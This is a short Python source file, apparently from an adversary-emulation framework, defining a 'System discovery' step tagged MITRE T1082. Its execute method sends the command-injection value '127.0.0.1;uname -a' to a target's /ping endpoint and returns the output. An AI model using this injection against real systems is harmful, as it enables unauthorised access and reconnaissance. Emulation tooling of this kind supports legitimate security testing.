import requests
from .base import AttackStep


class DiscoveryStep(AttackStep):
    name = "System discovery"
    mitre_id = "T1082"

    def __init__(self, target_url: str):
        self.target_url = target_url

    def execute(self) -> dict:
        r = requests.get(f"{self.target_url}/ping", params={"host": "127.0.0.1;uname -a"})
        output = r.json()["stdout"].strip()
        return {"summary": output}
